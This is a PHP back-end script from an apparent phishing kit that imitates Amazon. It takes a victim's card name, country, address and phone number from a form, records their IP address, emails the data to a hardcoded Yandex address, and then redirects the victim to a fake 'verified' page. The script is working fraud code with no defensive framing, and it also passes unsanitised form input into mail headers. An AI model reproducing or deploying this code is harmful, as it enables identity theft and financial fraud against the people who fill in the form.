<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "|Name on Card                   : ".$_POST['name']."\n";
$bilsmg .= "|Country-----: ".$_POST['country']."<br>\n";
$bilsmg .= "|Address-----: ".$_POST['street']."<br>\n";
$bilsmg .= "|Phone Number-----: ".$_POST['phone']."<br>\n";
;

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "jahanamcafe@yandex.com";
$bilsub = "Amazon.com | From $ip";
$bilhead = "From:Address <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../verified.html";
header("location:$src");
?>